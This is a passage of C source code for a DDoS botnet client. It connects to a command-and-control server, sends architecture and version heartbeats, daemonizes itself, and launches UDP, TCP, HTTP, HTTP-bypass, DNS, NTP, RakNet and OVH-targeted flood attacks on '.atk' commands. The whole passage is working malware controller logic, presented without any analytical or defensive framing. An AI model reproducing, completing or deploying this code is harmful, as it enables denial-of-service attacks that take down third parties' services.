        char args[512];
        snprintf(args, sizeof(args), "%s|%s|%s|%s",
                 target, port_str, dur_str,
                 threads_str ? threads_str : "10");
        attack_running = 1;
        tcp_flood(strdup(args));
    } else if (method && strcmp(method, "http") == 0) {
        char* saveptr2;
        char* copy = strdup(params);
        char* t = strtok_r(copy, "|", &saveptr2);
        char* p = strtok_r(NULL, "|", &saveptr2);
        char* d = strtok_r(NULL, "|", &saveptr2);
        char* threads_str = strtok_r(NULL, "|", &saveptr2);
        char* path_str = strtok_r(NULL, "|", &saveptr2);
        free(copy);
        char args[512];
        snprintf(args, sizeof(args), "%s|%s|%s|%s|%s",
                 target, port_str, dur_str,
                 threads_str ? threads_str : "10",
                 path_str ? path_str : "/");
        attack_running = 1;
        http_flood(strdup(args));
    } else if (method && strcmp(method, "http-bypass") == 0) {
        char* saveptr2;
        char* copy = strdup(params);
        char* t = strtok_r(copy, "|", &saveptr2);
        char* p = strtok_r(NULL, "|", &saveptr2);
        char* d = strtok_r(NULL, "|", &saveptr2);
        char* threads_str = strtok_r(NULL, "|", &saveptr2);
        char* path_str = strtok_r(NULL, "|", &saveptr2);
        free(copy);
        char args[512];
        snprintf(args, sizeof(args), "%s|%s|%s|%s|%s",
                 target, port_str, dur_str,
                 threads_str ? threads_str : "20",
                 path_str ? path_str : "/");
        attack_running = 1;
        http_bypass_flood(strdup(args));
    }
    free(params);
    attack_running = 0;
    return NULL;
}

void execute_command(char* cmd) {
    cmd = strtok(cmd, "\r\n");
    if (!cmd) return;
    if (strncmp(cmd, ".atk", 4) == 0) {
        char* saveptr;
        char* target = strtok_r(cmd + 5, " ", &saveptr);
        char* port_str = strtok_r(NULL, " ", &saveptr);
        char* duration_str = strtok_r(NULL, " ", &saveptr);
        char* method = strtok_r(NULL, " ", &saveptr);
        if (!target || !port_str || !duration_str) return;
        pthread_mutex_lock(&attack_mutex);
        if (attack_running) {
            attack_running = 0;
            pthread_join(attack_thread, NULL);
        }
        char args[512];
        if (method && strcmp(method, "ovh_udp") == 0) {
            char* threads_str = strtok_r(NULL, " ", &saveptr);
            char* limiter_str = strtok_r(NULL, " ", &saveptr);
            snprintf(args, sizeof(args), "%s|%s|%s|%s|%s",
                     target, port_str,
                     threads_str ? threads_str : "50",
                     limiter_str ? limiter_str : "100000",
                     duration_str);
        } else if (method && strcmp(method, "raknet") == 0) {
            char* threads_str = strtok_r(NULL, " ", &saveptr);
            char* size_str = strtok_r(NULL, " ", &saveptr);
            snprintf(args, sizeof(args), "%s|%s|%s|%s|%s",
                     target, port_str, duration_str,
                     threads_str ? threads_str : "10",
                     size_str ? size_str : "512");
        } else if (method && strcmp(method, "dns") == 0) {
            char* file_str = strtok_r(NULL, " ", &saveptr);
            char* threads_str = strtok_r(NULL, " ", &saveptr);
            snprintf(args, sizeof(args), "%s|%s|%s|%s|%s",
                     target, port_str, duration_str,
                     file_str ? file_str : "resolvers.txt",
                     threads_str ? threads_str : "10");
        } else if (method && strcmp(method, "ntp") == 0) {
            char* threads_str = strtok_r(NULL, " ", &saveptr);
            char* limiter_str = strtok_r(NULL, " ", &saveptr);
            snprintf(args, sizeof(args), "%s|%s|%s|%s",
                     target,
                     threads_str ? threads_str : "10",
                     limiter_str ? limiter_str : "1000",
                     duration_str);
        } else if (method && strcmp(method, "ovh_tcp") == 0) {
            char* threads_str = strtok_r(NULL, " ", &saveptr);
            char* limiter_str = strtok_r(NULL, " ", &saveptr);
            snprintf(args, sizeof(args), "%s|%s|%s|%s|%s",
                     target, port_str,
                     threads_str ? threads_str : "10",
                     limiter_str ? limiter_str : "1000",
                     duration_str);
        } else if (method && strcmp(method, "udp") == 0) {
            char* threads_str = strtok_r(NULL, " ", &saveptr);
            char* size_str = strtok_r(NULL, " ", &saveptr);
            snprintf(args, sizeof(args), "%s|%s|%s|%s|%s",
                     target, port_str, duration_str,
                     threads_str ? threads_str : "10",
                     size_str ? size_str : "1024");
        } else if (method && strcmp(method, "tcp") == 0) {
            char* threads_str = strtok_r(NULL, " ", &saveptr);
            snprintf(args, sizeof(args), "%s|%s|%s|%s",
                     target, port_str, duration_str,
                     threads_str ? threads_str : "10");
        } else if (method && strcmp(method, "http") == 0) {
            char* threads_str = strtok_r(NULL, " ", &saveptr);
            char* path_str = strtok_r(NULL, " ", &saveptr);
            snprintf(args, sizeof(args), "%s|%s|%s|%s|%s",
                     target, port_str, duration_str,
                     threads_str ? threads_str : "10",
                     path_str ? path_str : "/");
        } else if (method && strcmp(method, "http-bypass") == 0) {
            char* threads_str = strtok_r(NULL, " ", &saveptr);
            char* path_str = strtok_r(NULL, " ", &saveptr);
            snprintf(args, sizeof(args), "%s|%s|%s|%s|%s",
                     target, port_str, duration_str,
                     threads_str ? threads_str : "20",
                     path_str ? path_str : "/");
        } else {
            pthread_mutex_unlock(&attack_mutex);
            return;
        }
        attack_running = 1;
        pthread_create(&attack_thread, NULL, attack_dispatcher, strdup(args));
        pthread_mutex_unlock(&attack_mutex);
    } else if (strcmp(cmd, ".stop") == 0) {
        pthread_mutex_lock(&attack_mutex);
        if (attack_running) {
            attack_running = 0;
            pthread_join(attack_thread, NULL);
        }
        pthread_mutex_unlock(&attack_mutex);
    } else if (strcmp(cmd, "PING") == 0) {
        if (sock > 0) send(sock, "PONG\n", 5, 0);
    }
}

int connect_to_cnc() {
    struct sockaddr_in server_addr;
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(CNC_PORT);
    if (inet_pton(AF_INET, CNC_IP, &server_addr.sin_addr) <= 0) {
        close(sock);
        sock = -1;
        return -1;
    }
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        close(sock);
        sock = -1;
        return -1;
    }
    char handshake[256];
    snprintf(handshake, sizeof(handshake), "HBT|%s|%s\n", arch, version);
    send(sock, handshake, strlen(handshake), 0);
    char info[512];
    snprintf(info, sizeof(info), "INFO:{\"arch\":\"%s\",\"version\":\"%s\"}\n", arch, version);
    send(sock, info, strlen(info), 0);
    return 0;
}

void reconnect_loop() {
    while (running) {
        if (sock < 0) {
            connect_to_cnc();
            if (sock < 0) { sleep(5); continue; }
        }
        fd_set readfds;
        struct timeval tv;
        FD_ZERO(&readfds);
        FD_SET(sock, &readfds);
        tv.tv_sec = 20;
        tv.tv_usec = 0;
        int activity = select(sock + 1, &readfds, NULL, NULL, &tv);
        if (activity < 0) { close(sock); sock = -1; continue; }
        if (activity == 0) {
            send(sock, "HBT|linux_x86_64|1.0\n", 22, 0);
            continue;
        }
        if (FD_ISSET(sock, &readfds)) {
            char buffer[BUFFER_SIZE];
            int bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
            if (bytes <= 0) { close(sock); sock = -1; continue; }
            buffer[bytes] = '\0';
            char* line = strtok(buffer, "\n");
            while (line) {
                execute_command(line);
                line = strtok(NULL, "\n");
            }
        }
    }
}

int main() {
    daemonize();
    signal(SIGPIPE, SIG_IGN);
    srand(time(NULL) ^ getpid());
    init_rand(time(NULL) ^ getpid());
    reconnect_loop();
    return 0;
}